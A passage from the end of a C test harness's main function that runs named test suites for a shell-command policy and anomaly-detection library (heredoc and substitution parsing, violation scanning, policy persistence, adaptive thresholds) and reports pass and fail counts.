  RUN(canonical_heredoc_delimiter_contract);
  RUN(brace_local_document_policy_contract);
  RUN(nested_composition_matrix);
  RUN(arithmetic_substitution_dependency);
  RUN(dynamic_substitution_flow_contract);
  RUN(herestring_and_transformed_substitution_provenance);
  RUN(brace_group_process_substitution_result_contract);
  RUN(group_process_substitution_dynamic_consumer_contract);
  RUN(substitution_source_word_contract);
  RUN(process_substitution_interpreter_input_contract);
  RUN(process_substitution_direction_contract);
  RUN(process_substitution_operand_syntax_contract);
  RUN(command_position_group_syntax_contract);
  RUN(substitution_comment_and_heredoc_capacity_contract);
  RUN(compound_heredoc_substitution_cross_product_contract);
  RUN(compound_brace_substitution_boundary_contract);
  RUN(anomaly_group_heredoc_substitution_contract);
  RUN(anomaly_mixed_heredoc_substitution_contract);

  printf("\nFeature rejection:\n");
  RUN(conditional_substitution_matrix);
  RUN(process_substitution_wildcard_policy);

  printf("\nSuggestions:\n");
  RUN(suggestion_matrix);
  RUN(match_only_path_avoids_suggestion_allocations);
  RUN(suggestion_token_variant_contract);

  printf("\nEdge cases:\n");
  RUN(eval_input_contract_matrix);
  RUN(comment_only_source_does_not_trigger_feature_rejection);

  printf("\nConfiguration:\n");
  RUN(stop_mode_matrix);
  RUN(stop_mode_substitution_prefix);
  RUN(pipeline_many_subcommands);
  RUN(reject_mask_feature_matrix);

  printf("\nPolicy management:\n");
  RUN(policy_mutation_matrix);
  RUN(canonical_policy_mutation_matrix);
  RUN(policy_wrapper_error_translation);
  RUN(policy_evaluation_allocation_failure);

  printf("\nSerialization:\n");
  RUN(policy_persistence_matrix);

  printf("\nBuffer management:\n");
  RUN(buffer_contract_matrix);
  RUN(final_diagnostic_truncation_fails_closed);

  printf("\nExpansion callbacks:\n");
  RUN(expansion_callback_matrix);
  RUN(expansion_bounds_matrix);
  RUN(truncation_cross_product_matrix);

  printf("\nViolation scanning:\n");
  RUN(violation_rule_matrix);
  RUN(group_owned_violation_context);
  RUN(group_owned_multiple_redirect_violation_context);
  RUN(nested_group_owned_violation_scope);
  RUN(violation_configuration_matrix);
  RUN(violation_configuration_replacement_is_atomic);
  RUN(violation_capacity_contract);
  RUN(violation_dropped_types_remain_aggregated);
  RUN(violation_absence_matrix);

  printf("\nHelpers:\n");
  RUN(helper_contracts);
  RUN(glob_pattern_in_rule);

  printf("\nProperty tests:\n");
  srand(42);
  RUN(property_suggestion_leads_to_allow);

  printf("\nAnomaly detection:\n");
  RUN(anomaly_enable_disable);
  RUN(anomaly_learning_policy_matrix);
  RUN(anomaly_scoring_contract_matrix);
  RUN(anomaly_model_roundtrip);
  RUN(anomaly_bundle_corruption_matrix);
  RUN(anomaly_bundle_failure_atomicity);
  RUN(anomaly_bundle_load_allocation_failure);
  RUN(anomaly_allocation_failure_matrix);
  RUN(anomaly_calibration_matrix);
  RUN(anomaly_weight_matrix);
  RUN(anomaly_netseq_score_contract);
  RUN(anomaly_configuration_validation);

  printf("\nAdaptive threshold:\n");
  RUN(anomaly_adaptive_threshold_transitions);

  printf("\nType sequence cache:\n");
  RUN(anomaly_cache_equivalence_matrix);
  RUN(anomaly_cache_allocation_failure_matrix);
  RUN(anomaly_type_netseq_allocation_failure);
  RUN(anomaly_update_reuses_scored_netseq);
  RUN(anomaly_cache_model_transition_matrix);

  printf("\nSeparate scores:\n");
  RUN(anomaly_short_type_sequence_stays_finite);
  RUN(truncated_parse_without_subcommands_is_undetermined);

  printf("\nBayesian combination:\n");
  RUN(bayesian_combination_transitions);

  cleanup_temp_files();
  printf("\n========================================\n");
  printf("Results: %d passed, %d failed\n", pass_count, fail_count);
  return fail_count > 0 ? 1 : 0;
}
